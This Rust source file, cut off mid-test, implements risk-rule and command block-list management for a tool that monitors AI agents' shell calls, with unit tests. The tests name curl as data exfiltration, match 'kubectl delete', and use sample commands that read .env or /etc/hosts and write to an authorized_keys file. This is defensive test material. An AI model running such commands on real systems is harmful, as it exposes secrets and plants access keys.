use serde::{Deserialize, Serialize};

use super::classifier::{validate_pattern, CommandListEntry, CommandListType, CommandMatchKind};
use std::sync::Mutex;

use super::runtime::{publish_tool_risk_runtime, ToolRiskRuntime};
use super::types::*;
use crate::database::{
    Database, ToolRiskActor, ToolRiskAuditStatus, ToolRiskSettings, ToolRiskWriteReceipt,
};
use crate::error::AppError;

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ToolRiskMutationReceipt<T> {
    pub value: T,
    pub persisted_policy_version: u64,
    pub audit_status: ToolRiskAuditStatus,
    pub runtime_status: ToolRiskRuntimeStatus,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum ToolRiskRuntimeStatus {
    Applied,
    ApplyFailed,
}

impl<T> ToolRiskMutationReceipt<T> {
    fn map_value<U>(self, value: U) -> ToolRiskMutationReceipt<U> {
        ToolRiskMutationReceipt {
            value,
            persisted_policy_version: self.persisted_policy_version,
            audit_status: self.audit_status,
            runtime_status: self.runtime_status,
        }
    }
}

static CONFIGURATION_LOCK: Mutex<()> = Mutex::new(());

#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct SaveCommandListInput {
    pub id: Option<String>,
    pub expected_revision: Option<u32>,
    pub list_type: CommandListType,
    pub match_kind: CommandMatchKind,
    pub pattern: String,
    pub enabled: bool,
    pub severity: Severity,
    pub risk_category: RiskCategory,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct CommandPatternPreview {
    pub event_id: i64,
    pub matched: bool,
    pub summary_only: bool,
}

pub fn get_command_lists(db: &Database) -> Result<Vec<CommandListEntry>, String> {
    db.get_tool_risk_command_lists()
        .map_err(|error| error.to_string())
}

pub fn save_command_list(
    db: &Database,
    input: SaveCommandListInput,
) -> Result<ToolRiskMutationReceipt<String>, String> {
    let (id, revision) = match (input.id, input.expected_revision) {
        (None, None) => (format!("shell-list-{}", uuid::Uuid::new_v4()), 1),
        (Some(id), Some(expected)) if !id.trim().is_empty() && !id.starts_with("builtin.") => (
            id,
            expected
                .checked_add(1)
                .ok_or_else(|| "名单版本已耗尽".to_string())?,
        ),
        _ => return Err("新增名单不得指定版本；编辑必须提供 ID 和期望版本".into()),
    };
    let entry = CommandListEntry {
        id: id.clone(),
        revision,
        list_type: input.list_type,
        match_kind: input.match_kind,
        pattern: input.pattern,
        enabled: input.enabled,
        severity: input.severity,
        risk_category: input.risk_category,
    };
    entry
        .validate()
        .map_err(|_| "工具风险命令名单定义无效".to_string())?;
    mutate(db, || {
        db.save_tool_risk_command_list_with_actor(
            &entry,
            input.expected_revision,
            ToolRiskActor::LocalUi,
        )
    })
    .map(|receipt| receipt.map_value(id))
}

pub fn delete_command_list(
    db: &Database,
    id: &str,
    expected_revision: u32,
) -> Result<ToolRiskMutationReceipt<bool>, String> {
    mutate(db, || {
        db.delete_tool_risk_command_list_with_actor(id, expected_revision, ToolRiskActor::LocalUi)
    })
}

pub fn preview_command_pattern(
    db: &Database,
    match_kind: CommandMatchKind,
    pattern: &str,
) -> Result<Vec<CommandPatternPreview>, String> {
    validate_pattern(match_kind, pattern).map_err(|_| "工具风险命令模式无效".to_string())?;
    let summaries = db
        .get_tool_risk_command_summary_preview()
        .map_err(|error| error.to_string())?;
    Ok(summaries
        .into_iter()
        .map(|(event_id, summary)| CommandPatternPreview {
            event_id,
            matched: super::classifier::summary_pattern_matches(match_kind, pattern, &summary),
            summary_only: true,
        })
        .collect())
}

#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct SaveCustomRuleInput {
    pub id: Option<String>,
    pub name: String,
    pub description: Option<String>,
    pub enabled: bool,
    pub selector: RuleSelector,
    pub conditions: Vec<RuleCondition>,
    pub risk_category: RiskCategory,
    pub severity: Severity,
    pub reason_code: String,
    pub local_review: LocalReview,
    pub expected_revision: Option<u32>,
}

fn reload_locked(db: &Database) -> Result<(), String> {
    reload_locked_with_publisher(db, &mut publish_tool_risk_runtime)
}

fn reload_locked_with_publisher(
    db: &Database,
    publisher: &mut impl FnMut(ToolRiskRuntime) -> bool,
) -> Result<(), String> {
    let (settings, rules, command_lists) = match db.get_tool_risk_configuration_snapshot() {
        Ok(configuration) => configuration,
        Err(_) => {
            publisher(ToolRiskRuntime::default());
            return Err("工具风险配置读取失败，采集已关闭".into());
        }
    };
    if rules.iter().any(|rule| rule.validate().is_err())
        || command_lists.iter().any(|entry| entry.validate().is_err())
    {
        publisher(ToolRiskRuntime::default());
        return Err("工具风险规则定义无效".into());
    }
    if !publisher(ToolRiskRuntime {
        enabled: settings.enabled,
        policy_version: settings.policy_version,
        rules,
        command_lists,
    }) {
        return Err("工具风险运行时发布失败，采集已关闭".into());
    }
    Ok(())
}

pub fn reload_runtime(db: &Database) -> Result<(), String> {
    let _guard = CONFIGURATION_LOCK
        .lock()
        .map_err(|_| "工具风险配置锁不可用".to_string())?;
    reload_locked(db)
}

fn mutate<T>(
    db: &Database,
    action: impl FnOnce() -> Result<ToolRiskWriteReceipt<T>, AppError>,
) -> Result<ToolRiskMutationReceipt<T>, String> {
    mutate_with_publisher(db, action, publish_tool_risk_runtime)
}

fn mutate_with_publisher<T>(
    db: &Database,
    action: impl FnOnce() -> Result<ToolRiskWriteReceipt<T>, AppError>,
    mut publisher: impl FnMut(ToolRiskRuntime) -> bool,
) -> Result<ToolRiskMutationReceipt<T>, String> {
    let _guard = CONFIGURATION_LOCK
        .lock()
        .map_err(|_| "工具风险配置锁不可用".to_string())?;

    let receipt = action().map_err(|error| match error {
        AppError::Database(code)
            if matches!(
                code.as_str(),
                "tool_risk_builtin_duplicate"
                    | "tool_risk_risk_severity_required"
                    | "tool_risk_command_list_duplicate"
                    | "tool_risk_command_list_conflict"
                    | "tool_risk_command_list_limit"
            ) =>
        {
            code
        }
        _ => "工具风险配置保存失败，请刷新后重试".to_string(),
    })?;
    let runtime_status = match reload_locked_with_publisher(db, &mut publisher) {
        Ok(()) => ToolRiskRuntimeStatus::Applied,
        Err(_) => {
            log::warn!("[ToolRisk] apply_failed");
            ToolRiskRuntimeStatus::ApplyFailed
        }
    };
    Ok(ToolRiskMutationReceipt {
        value: receipt.value,
        persisted_policy_version: receipt.persisted_policy_version,
        audit_status: receipt.audit_status,
        runtime_status,
    })
}

pub fn get_rules(db: &Database) -> Result<Vec<ToolRiskRule>, String> {
    db.get_tool_risk_configuration()
        .map(|(_, rules)| rules)
        .map_err(|error| error.to_string())
}

pub fn get_rule(db: &Database, id: &str) -> Result<Option<ToolRiskRule>, String> {
    Ok(get_rules(db)?.into_iter().find(|rule| rule.id == id))
}

pub fn save_custom_rule(
    db: &Database,
    input: SaveCustomRuleInput,
) -> Result<ToolRiskMutationReceipt<String>, String> {
    let (id, revision) = match (input.id, input.expected_revision) {
        (None, None) => (format!("custom-{}", uuid::Uuid::new_v4()), 1),
        (Some(id), Some(expected)) if !id.starts_with("builtin.") && !id.trim().is_empty() => {
            let revision = expected
                .checked_add(1)
                .ok_or_else(|| "规则版本已耗尽".to_string())?;
            (id, revision)
        }
        _ => return Err("新增规则不得指定版本；编辑必须提供 ID 和期望版本".into()),
    };
    let rule = ToolRiskRule {
        schema_version: 1,
        id: id.clone(),
        revision,
        origin: RuleOrigin::Custom,
        name: input.name,
        description: input.description,
        enabled: input.enabled,
        selector: input.selector,
        conditions: input.conditions,
        risk_category: input.risk_category,
        severity: input.severity,
        reason_code: input.reason_code,
        local_review: input.local_review,
    };
    rule.validate()
        .map_err(|_| "工具风险规则定义无效".to_string())?;
    mutate(db, || {
        db.save_custom_tool_risk_rule_with_actor(
            &rule,
            input.expected_revision,
            ToolRiskActor::LocalUi,
        )
    })
    .map(|receipt| receipt.map_value(id))
}

pub fn delete_custom_rule(
    db: &Database,
    id: &str,
    expected_revision: u32,
) -> Result<ToolRiskMutationReceipt<bool>, String> {
    if id.starts_with("builtin.") {
        return Err("不能删除内置规则".into());
    }
    mutate(db, || {
        db.delete_custom_tool_risk_rule_with_actor(id, expected_revision, ToolRiskActor::LocalUi)
    })
}

pub fn toggle_rule(
    db: &Database,
    id: &str,
    enabled: bool,
    expected_revision: u32,
) -> Result<ToolRiskMutationReceipt<()>, String> {
    mutate(db, || {
        if id.starts_with("builtin.") {
            return db.set_builtin_tool_risk_override_with_actor(
                id,
                enabled,
                expected_revision,
                ToolRiskActor::LocalUi,
            );
        }
        let mut rule = db
            .get_custom_tool_risk_rule(id)?
            .ok_or_else(|| AppError::Database("规则不存在".into()))?;
        if rule.revision != expected_revision {
            return Err(AppError::Database("规则版本冲突，请刷新后重试".into()));
        }
        rule.revision = expected_revision
            .checked_add(1)
            .ok_or_else(|| AppError::Database("规则版本已耗尽".into()))?;
        rule.enabled = enabled;
        db.save_custom_tool_risk_rule_with_actor(
            &rule,
            Some(expected_revision),
            ToolRiskActor::LocalUi,
        )
    })
}

pub fn reset_builtin_rule(
    db: &Database,
    id: &str,
    expected_revision: u32,
) -> Result<ToolRiskMutationReceipt<()>, String> {
    mutate(db, || {
        db.clear_builtin_tool_risk_override_with_actor(
            id,
            expected_revision,
            ToolRiskActor::LocalUi,
        )
    })
}

pub fn update_settings(
    db: &Database,
    settings: &ToolRiskSettings,
) -> Result<ToolRiskMutationReceipt<()>, String> {
    mutate(db, || {
        db.save_tool_risk_settings_with_actor(settings, ToolRiskActor::LocalUi)
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::database::Database;
    use crate::services::tool_risk::builtin::builtin_rules;

    fn input() -> SaveCustomRuleInput {
        let rule = builtin_rules().remove(0);
        SaveCustomRuleInput {
            id: None,
            name: "custom rule".into(),
            description: None,
            enabled: true,
            selector: RuleSelector {
                clients: Some(vec!["claude".into()]),
                ..rule.selector
            },
            conditions: rule.conditions,
            risk_category: rule.risk_category,
            severity: rule.severity,
            reason_code: rule.reason_code,
            local_review: LocalReview::Off,
            expected_revision: None,
        }
    }

    #[test]
    #[serial_test::serial]
    fn edits_require_expected_revision_and_never_overwrite_on_conflict() {
        let db = Database::memory().unwrap();
        let id = save_custom_rule(&db, input()).unwrap().value;
        let mut edit = input();
        edit.id = Some(id.clone());
        assert!(save_custom_rule(&db, edit.clone()).is_err());
        edit.expected_revision = Some(1);
        edit.name = "edited".into();
        assert_eq!(save_custom_rule(&db, edit.clone()).unwrap().value, id);
        assert!(save_custom_rule(&db, edit).is_err());
        let saved = get_rule(&db, &id).unwrap().unwrap();
        assert_eq!(saved.revision, 2);
        assert_eq!(saved.name, "edited");
        assert_eq!(db.get_tool_risk_settings().unwrap().policy_version, 2);
    }

    #[test]
    #[serial_test::serial]
    fn creation_cannot_claim_revision_and_overflow_does_not_panic() {
        let db = Database::memory().unwrap();
        let mut create = input();
        create.expected_revision = Some(1);
        assert!(save_custom_rule(&db, create).is_err());
        let mut edit = input();
        edit.id = Some("custom-missing".into());
        edit.expected_revision = Some(u32::MAX);
        assert!(save_custom_rule(&db, edit).is_err());
        assert!(db.get_custom_tool_risk_rules().unwrap().is_empty());
    }

    #[test]
    #[serial_test::serial]
    fn builtin_detail_obeys_saved_enabled_override() {
        let db = Database::memory().unwrap();
        toggle_rule(&db, "builtin.sensitive_read", false, 1).unwrap();
        assert!(
            !get_rule(&db, "builtin.sensitive_read")
                .unwrap()
                .unwrap()
                .enabled
        );
        reset_builtin_rule(&db, "builtin.sensitive_read", 2).unwrap();
        assert!(
            get_rule(&db, "builtin.sensitive_read")
                .unwrap()
                .unwrap()
                .enabled
        );
    }

    #[test]
    #[serial_test::serial]
    fn enabling_keeps_configuration_and_publishes_server_version() {
        let db = Database::memory().unwrap();
        toggle_rule(&db, "builtin.sensitive_read", false, 1).unwrap();
        let id = save_custom_rule(&db, input()).unwrap().value;
        update_settings(
            &db,
            &crate::database::ToolRiskSettings {
                enabled: true,
                policy_version: u64::MAX,
            },
        )
        .unwrap();
        let runtime = crate::services::tool_risk::runtime::get_tool_risk_runtime();
        assert!(runtime.enabled);
        assert_eq!(runtime.policy_version, 3);
        assert!(runtime.rules.iter().any(|rule| rule.id == id));
        assert!(
            !runtime
                .rules
                .iter()
                .find(|rule| rule.id == "builtin.sensitive_read")
                .unwrap()
                .enabled
        );
    }

    #[test]
    fn ipc_editable_input_matches_frontend_and_rejects_server_fields() {
        let json = serde_json::json!({
            "id": "custom-example", "name": "x", "enabled": true,
            "selector": {"target": {"kind": "operation", "types": ["file_read"]}},
            "conditions": [{"field": "/target_path", "op": "detector", "value": "sensitive_path"}],
            "riskCategory": "sensitive_read", "severity": "high",
            "reasonCode": "sensitive_target", "localReview": "off", "expectedRevision": 1
        });
        let input: SaveCustomRuleInput = serde_json::from_value(json.clone()).unwrap();
        assert_eq!(input.expected_revision, Some(1));
        let mut forged = json;
        forged["origin"] = serde_json::json!("builtin");
        assert!(serde_json::from_value::<SaveCustomRuleInput>(forged).is_err());
    }

    #[test]
    #[serial_test::serial]
    fn builtin_mutations_require_current_revision_and_persist_it() {
        let db = Database::memory().unwrap();
        toggle_rule(&db, "builtin.sensitive_read", false, 1).unwrap();
        let rule = get_rule(&db, "builtin.sensitive_read").unwrap().unwrap();
        assert_eq!(rule.revision, 2);
        assert!(!rule.enabled);
        assert!(toggle_rule(&db, &rule.id, true, 1).is_err());
        assert!(reset_builtin_rule(&db, &rule.id, 1).is_err());
        assert_eq!(db.get_tool_risk_settings().unwrap().policy_version, 1);
        reset_builtin_rule(&db, &rule.id, 2).unwrap();
        assert_eq!(get_rule(&db, &rule.id).unwrap().unwrap().revision, 3);
        assert!(get_rule(&db, &rule.id).unwrap().unwrap().enabled);
    }

    #[test]
    #[serial_test::serial]
    fn custom_toggle_and_delete_reject_stale_revision() {
        let db = Database::memory().unwrap();
        let id = save_custom_rule(&db, input()).unwrap().value;
        toggle_rule(&db, &id, false, 1).unwrap();
        assert!(toggle_rule(&db, &id, true, 1).is_err());
        assert!(delete_custom_rule(&db, &id, 1).is_err());
        assert_eq!(db.get_tool_risk_settings().unwrap().policy_version, 2);
        assert_eq!(get_rule(&db, &id).unwrap().unwrap().revision, 2);
        assert!(delete_custom_rule(&db, &id, 2).unwrap().value);
    }
}

#[cfg(test)]
mod command_list_tests {
    use super::*;
    use crate::services::tool_risk::classifier::{CommandListType, CommandMatchKind};
    use crate::services::tool_risk::runtime::get_tool_risk_runtime;

    fn input() -> SaveCommandListInput {
        SaveCommandListInput {
            id: None,
            expected_revision: None,
            list_type: CommandListType::Blacklist,
            match_kind: CommandMatchKind::Program,
            pattern: "curl".into(),
            enabled: true,
            severity: Severity::High,
            risk_category: RiskCategory::DataExfiltration,
        }
    }

    #[test]
    #[serial_test::serial]
    fn command_lists_service_generates_ids_and_republishes_lists_with_revision() {
        let db = Database::memory().unwrap();
        let id = save_command_list(&db, input()).unwrap().value;
        assert!(id.starts_with("shell-list-"));
        assert!(uuid::Uuid::parse_str(id.trim_start_matches("shell-list-")).is_ok());
        let mut edit = input();
        edit.id = Some(id.clone());
        assert!(save_command_list(&db, edit.clone()).is_err());
        edit.expected_revision = Some(1);
        edit.enabled = false;
        assert_eq!(save_command_list(&db, edit.clone()).unwrap().value, id);
        assert!(save_command_list(&db, edit).is_err());
        let lists = get_command_lists(&db).unwrap();
        assert_eq!(lists.len(), 1);
        assert_eq!(lists[0].revision, 2);
        assert!(!lists[0].enabled);
        let runtime = get_tool_risk_runtime();
        assert_eq!(runtime.command_lists, lists);
        assert_eq!(runtime.policy_version, 2);
        assert!(delete_command_list(&db, &id, 1).is_err());
        assert!(delete_command_list(&db, &id, 2).unwrap().value);
        assert!(get_tool_risk_runtime().command_lists.is_empty());
        assert_eq!(get_tool_risk_runtime().policy_version, 3);
    }

    #[test]
    #[serial_test::serial]
    fn reported_kubectl_regex_can_be_created_after_preview() {
        let directory = tempfile::tempdir().unwrap();
        let db = Database::init_at(&directory.path().join("cc-switch.db")).unwrap();
        let mut input = input();
        input.match_kind = CommandMatchKind::Regex;
        input.pattern = r"^kubectl\s+delete\s+".into();
        input.risk_category = RiskCategory::DestructiveChange;
        preview_command_pattern(&db, input.match_kind, &input.pattern).unwrap();
        let receipt = save_command_list(&db, input).unwrap();
        assert_eq!(get_command_lists(&db).unwrap()[0].id, receipt.value);
    }

    #[test]
    #[serial_test::serial]
    fn duplicate_command_list_reports_a_specific_safe_error() {
        let db = Database::memory().unwrap();
        save_command_list(&db, input()).unwrap();
        assert_eq!(
            save_command_list(&db, input()).unwrap_err(),
            "tool_risk_command_list_duplicate"
        );
        assert_eq!(get_command_lists(&db).unwrap().len(), 1);
    }

    #[test]
    #[serial_test::serial]
    fn command_lists_service_rejects_client_revisions_and_invalid_patterns_before_mutation() {
        let db = Database::memory().unwrap();
        let mut create = input();
        create.expected_revision = Some(1);
        assert!(save_command_list(&db, create).is_err());
        let mut overflow = input();
        overflow.id = Some("shell-list-missing".into());
        overflow.expected_revision = Some(u32::MAX);
        assert!(save_command_list(&db, overflow).is_err());
        let mut invalid = input();
        invalid.match_kind = CommandMatchKind::Regex;
        invalid.pattern = "[".into();
        assert!(save_command_list(&db, invalid).is_err());
        assert_eq!(db.get_tool_risk_settings().unwrap().policy_version, 0);
        assert!(get_command_lists(&db).unwrap().is_empty());
    }

    #[test]
    fn command_lists_ipc_input_is_camel_case_and_rejects_server_revision() {
        let json = serde_json::json!({ "listType": "blacklist", "matchKind": "program", "pattern": "curl",
            "enabled": true, "severity": "high", "riskCategory": "data_exfiltration" });
        let create: SaveCommandListInput = serde_json::from_value(json.clone()).unwrap();
        assert!(create.id.is_none());
        assert!(create.expected_revision.is_none());
        let mut edit = json.clone();
        edit["id"] = serde_json::json!("shell-list-existing");
        edit["expectedRevision"] = serde_json::json!(4);
        assert_eq!(
            serde_json::from_value::<SaveCommandListInput>(edit)
                .unwrap()
                .expected_revision,
            Some(4)
        );
        let mut forged = json;
        forged["revision"] = serde_json::json!(1);
        assert!(serde_json::from_value::<SaveCommandListInput>(forged).is_err());
    }

    #[test]
    #[serial_test::serial]
    fn command_lists_bad_persisted_data_closes_runtime_instead_of_reusing_old_policy() {
        let db = Database::memory().unwrap();
        save_command_list(&db, input()).unwrap();
        update_settings(
            &db,
            &ToolRiskSettings {
                enabled: true,
                policy_version: 0,
            },
        )
        .unwrap();
        assert!(get_tool_risk_runtime().enabled);
        db.conn
            .lock()
            .unwrap()
            .execute(
                "UPDATE tool_risk_command_lists SET definition = 'SECRET_INVALID_LIST'",
                [],
            )
            .unwrap();
        let error = reload_runtime(&db).unwrap_err();
        assert!(!error.contains("SECRET_INVALID_LIST"));
        assert!(!get_tool_risk_runtime().enabled);
        assert!(get_tool_risk_runtime().command_lists.is_empty());
    }

    #[test]
    fn command_lists_preview_uses_only_twenty_latest_sanitized_summaries_and_never_echoes_them() {
        let db = Database::memory().unwrap();
        for timestamp in 0..25 {
            db.conn.lock().unwrap().execute("INSERT INTO tool_risk_events (timestamp, source, stage, detection_scope, integrity_status, policy_version, command_summary)
                VALUES (?1, 'model_response', 'proposed', 'in_scope', 'complete', 0, ?2)",
                rusqlite::params![timestamp, if timestamp % 2 == 0 { "curl --password 'SECRET_PREVIEW'" } else { "echo curl" }]).unwrap();
        }
        db.conn.lock().unwrap().execute("INSERT INTO tool_risk_events (timestamp, source, stage, detection_scope, integrity_status, policy_version) VALUES (100, 'model_response', 'proposed', 'in_scope', 'complete', 0)", []).unwrap();
        let preview = preview_command_pattern(&db, CommandMatchKind::Program, "curl").unwrap();
        assert_eq!(preview.len(), 20);
        assert_eq!(preview[0].event_id, 25);
        assert_eq!(preview[19].event_id, 6);
        assert!(preview.iter().all(|item| item.summary_only));
        assert_eq!(preview.iter().filter(|item| item.matched).count(), 10);
        let json = serde_json::to_value(&preview[0]).unwrap();
        assert_eq!(
            json,
            serde_json::json!({"eventId": 25, "matched": true, "summaryOnly": true})
        );
        assert!(!serde_json::to_string(&preview)
            .unwrap()
            .contains("SECRET_PREVIEW"));
        assert!(
            preview_command_pattern(&db, CommandMatchKind::Keyword, "SECRET_PREVIEW")
                .unwrap()
                .iter()
                .all(|item| !item.matched)
        );
        assert!(preview_command_pattern(&db, CommandMatchKind::Regex, "[").is_err());

        db.conn.lock().unwrap().execute("UPDATE tool_risk_events SET command_summary = 'curl --password SECRET_PREVIEW' WHERE id = 25", []).unwrap();
        let conservative = preview_command_pattern(&db, CommandMatchKind::Program, "curl").unwrap();
        assert!(!conservative[0].matched);
        assert!(conservative[0].summary_only);
        assert_eq!(db.get_tool_risk_settings().unwrap().policy_version, 0);
    }
}

#[cfg(test)]
mod phase1_publication_tests {
    use super::*;
    use crate::proxy::tool_observation::types::*;
    use crate::services::tool_risk::engine::{evaluate, EngineInput, RiskDecision, Verdict};
    use crate::services::tool_risk::runtime::{
        get_tool_risk_runtime, set_tool_risk_runtime_for_test,
    };
    use serde_json::json;

    struct RuntimeReset;

    impl Drop for RuntimeReset {
        fn drop(&mut self) {
            set_tool_risk_runtime_for_test(ToolRiskRuntime::default());
        }
    }

    struct Fixture {
        db: Database,
        _reset: RuntimeReset,
    }

    impl Fixture {
        fn new() -> Self {
            let reset = RuntimeReset;
            set_tool_risk_runtime_for_test(ToolRiskRuntime::default());
            let db = Database::memory().unwrap();
            update_settings(
                &db,
                &ToolRiskSettings {
                    enabled: true,
                    policy_version: 0,
                },
            )
            .unwrap();
            Self { db, _reset: reset }
        }

        fn evaluate(&self, command: &str) -> RiskDecision {
            let runtime = get_tool_risk_runtime();
            let settings = self.db.get_tool_risk_settings().unwrap();
            assert!(runtime.enabled);
            assert_eq!(runtime.policy_version, settings.policy_version);
            let observation = observation(command);
            let before = observation.clone();
            let result = evaluate(&EngineInput {
                observation: &observation,
                rules: &runtime.rules,
                lists: &runtime.command_lists,
            });
            assert_eq!(observation, before);
            result
        }
    }

    fn observation(command: &str) -> ToolObservation {
        ToolObservation {
            schema_version: 1,
            observation_id: "phase1-publication".into(),
            source: ObservationSource::ModelResponse,
            stage: ObservationStage::Proposed,
            execution_scope: ExecutionScope::Client,
            protocol: "anthropic_messages".into(),
            scope_id: "phase1-memory-fixture".into(),
            correlation: Correlation::default(),
            tool: ToolIdentity {
                client: Some("claude".into()),
                name: "Bash".into(),
                namespace: None,
                server_id: None,
                definition_ref: Some("builtin:claude:tools:v1".into()),
            },
            input: ToolInput {
                encoding: InputEncoding::Json,
                value: Some(json!({"command": command})),
                status: InputStatus::Complete,
            },
            quality: ObservationQuality {
                origin: QualityOrigin::Native,
                source_termination: SourceTermination::Normal,
                tool_identity: ToolIdentityQuality::Source,
                input_fidelity: InputFidelity::Preserved,
            },
            context: ObservationContext::default(),
        }
    }

    fn path_condition(op: ConditionOp, value: &str) -> RuleCondition {
        RuleCondition {
            field: "/target_path".into(),
            op,
            value: Some(value.into()),
            values: None,
        }
    }

    fn custom_write_rule(conditions: Vec<RuleCondition>) -> SaveCustomRuleInput {
        SaveCustomRuleInput {
            id: None,
            name: "Phase1 custom write target".into(),
            description: None,
            enabled: true,
            selector: RuleSelector {
                sources: Some(vec!["model_response".into()]),
                clients: Some(vec!["claude".into()]),
                target: RuleTarget::Operation {
                    types: vec![OperationType::FileWrite],
                },
            },
            conditions,
            risk_category: RiskCategory::DestructiveChange,
            severity: Severity::Medium,
            reason_code: "destructive_target".into(),
            local_review: LocalReview::Off,
            expected_revision: None,
        }
    }

    fn has_hit(result: &RiskDecision, id: &str, reason: &str) -> bool {
        result
            .hits
            .iter()
            .any(|hit| hit.rule_id == id && hit.reason_code == reason)
    }

    #[test]
    #[serial_test::serial]
    fn saved_custom_rule_publishes_and_matches_ordinary_redirection_target() {
        let fixture = Fixture::new();
        let before = get_tool_risk_runtime();
        let path = "work/risk-demo/plain.txt";
        let id = save_custom_rule(
            &fixture.db,
            custom_write_rule(vec![path_condition(ConditionOp::Eq, path)]),
        )
        .unwrap()
        .value;
        let published = get_tool_risk_runtime();
        assert_eq!(published.policy_version, before.policy_version + 1);
        assert!(!before.rules.iter().any(|rule| rule.id == id));
        assert!(published
            .rules
            .iter()
            .any(|rule| rule.id == id && rule.revision == 1));
        for command in [
            "echo hi > work/risk-demo/plain.txt",
            "cat /etc/hosts >> work/risk-demo/plain.txt",
        ] {
            let result = fixture.evaluate(command);
            assert_eq!(
                result.verdict,
                Some(Verdict::Risky),
                "{command}: {result:?}"
            );
            assert!(
                has_hit(&result, &id, "destructive_target"),
                "{command}: {result:?}"
            );
            assert!(result
                .operation_categories
                .contains(&OperationType::FileWrite));
            assert_eq!(
                result.hits.len(),
                1,
                "ordinary target must not create builtin hits: {result:?}"
            );
        }
        let other = fixture.evaluate("echo hi > work/risk-demo/other.txt");
        assert_eq!(other.verdict, Some(Verdict::Uncertain), "{other:?}");
        assert!(other.hits.is_empty(), "{other:?}");
    }

    #[test]
    #[serial_test::serial]
    fn builtin_security_rule_toggle_preserves_facts_and_other_rule_hits() {
        let fixture = Fixture::new();
        let path = "work/risk-demo/authorized_keys";
        let mut input = custom_write_rule(vec![path_condition(ConditionOp::Eq, path)]);
        input.risk_category = RiskCategory::SecurityConfigChange;
        input.reason_code = "security_config_target".into();
        let custom_id = save_custom_rule(&fixture.db, input).unwrap().value;
        let command = "cat < .env > work/risk-demo/authorized_keys";
        let enabled_snapshot = get_tool_risk_runtime();
        let enabled = fixture.evaluate(command);
        assert_eq!(enabled.verdict, Some(Verdict::Risky), "{enabled:?}");
        assert!(
            has_hit(
                &enabled,
                "builtin.security_config_change",
                "security_config_target"
            ),
            "{enabled:?}"
        );
        assert!(
            has_hit(&enabled, "builtin.sensitive_read", "sensitive_target"),
            "{enabled:?}"
        );
        assert!(
            has_hit(&enabled, &custom_id, "security_config_target"),
            "{enabled:?}"
        );
        assert!(enabled
            .operation_categories
            .contains(&OperationType::FileWrite));
        assert!(enabled
            .operation_categories
            .contains(&OperationType::FileRead));

        toggle_rule(&fixture.db, "builtin.security_config_change", false, 1).unwrap();
        let disabled_snapshot = get_tool_risk_runtime();
        assert_eq!(
            disabled_snapshot.policy_version,
            enabled_snapshot.policy_version + 1
        );
        assert!(enabled_snapshot
            .rules
            .iter()
            .any(|rule| rule.id == "builtin.security_config_change" && rule.enabled));
        assert!(disabled_snapshot
            .rules
            .iter()
            .any(|rule| rule.id == "builtin.security_config_change"
                && !rule.enabled
                && rule.revision == 2));
        let disabled = fixture.evaluate(command);
        assert_eq!(disabled.verdict, Some(Verdict::Risky), "{disabled:?}");
        assert!(!disabled
            .hits
            .iter()
            .any(|hit| hit.rule_id == "builtin.security_config_change"));
        assert!(!disabled
            .evaluated_rule_ids
            .iter()
            .any(|id| id == "builtin.security_config_change"));
        assert!(
            has_hit(&disabled, "builtin.sensitive_read", "sensitive_target"),
            "{disabled:?}"
        );
        assert!(
            has_hit(&disabled, &custom_id, "security_config_target"),
            "{disabled:?}"
        );
        assert_eq!(disabled.operation_categories, enabled.operation_categories);

        toggle_rule(&fixture.db, "builtin.security_config_change", true, 2).unwrap();
        let restored_snapshot = get_tool_risk_runtime();
        assert_eq!(
            restored_snapshot.policy_version,
            disabled_snapshot.policy_version + 1
        );
        assert!(restored_snapshot
            .rules
            .iter()
            .any(|rule| rule.id == "builtin.security_config_change"
                && rule.enabled
                && rule.revision == 3));
        let restored = fixture.evaluate(command);
        assert_eq!(restored.verdict, Some(Verdict::Risky), "{restored:?}");
        assert!(restored
            .hits
            .iter()
            .any(|hit| hit.rule_id == "builtin.security_config_change"
                && hit.revision == 3
                && hit.reason_code == "security_config_target"));
        assert!(has_hit(
            &restored,
            "builtin.sensitive_read",
            "sensitive_target"
        ));
        assert!(has_hit(&restored, &custom_id, "security_config_target"));
        assert_eq!(restored.operation_categories, enabled.operation_categories);
    }

    #[test]
    #[serial_test::serial]
    fn separate_redirection_paths_cannot_join_conditions_across_operations() {
        let fixture = Fixture::new();
        let alpha_id = save_custom_rule(
            &fixture.db,
            custom_write_rule(vec![path_condition(
                ConditionOp::Eq,
                "work/risk-demo/alpha.log",
            )]),
        )
        .unwrap()
        .value;
        let beta_id = save_custom_rule(
            &fixture.db,
            custom_write_rule(vec![path_condition(
                ConditionOp::Eq,
                "work/risk-demo/beta.log",
            )]),
        )
        .unwrap()
        .value;
        let joined_id = save_custom_rule(
            &fixture.db,
            custom_write_rule(vec![
                path_condition(ConditionOp::Keyword, "alpha"),
                path_condition(ConditionOp::Keyword, "beta"),
            ]),
        )
        .unwrap()
        .value;
        let separate =
            fixture.evaluate("echo hi > work/risk-demo/alpha.log 2> work/risk-demo/beta.log");
        assert_eq!(separate.verdict, Some(Verdict::Risky), "{separate:?}");
        assert!(
            has_hit(&separate, &alpha_id, "destructive_target"),
            "{separate:?}"
        );
        assert!(
            has_hit(&separate, &beta_id, "destructive_target"),
            "{separate:?}"
        );
        assert!(
            !separate.hits.iter().any(|hit| hit.rule_id == joined_id),
            "cross-operation condition join: {separate:?}"
        );
        assert_eq!(
            separate
                .operation_categories
                .iter()
                .filter(|kind| **kind == OperationType::FileWrite)
                .count(),
            2
        );

        let same = fixture.evaluate("echo hi > work/risk-demo/alpha-beta.log");
        assert_eq!(same.verdict, Some(Verdict::Risky), "{same:?}");
        assert!(
            has_hit(&same, &joined_id, "destructive_target"),
            "same-operation control must match: {same:?}"
        );
        assert_eq!(same.hits.len(), 1);
    }
}

#[cfg(test)]
mod phase2_publication_tests {
    use super::*;
    use crate::proxy::tool_observation::types::*;
    use crate::services::tool_risk::engine::{evaluate, EngineInput, RiskDecision, Verdict};
    use crate::services::tool_risk::runtime::{
        get_tool_risk_runtime, set_tool_risk_runtime_for_test,
    };
    use serde_json::json;

    struct RuntimeReset;

    impl Drop for RuntimeReset {
        fn drop(&mut self) {
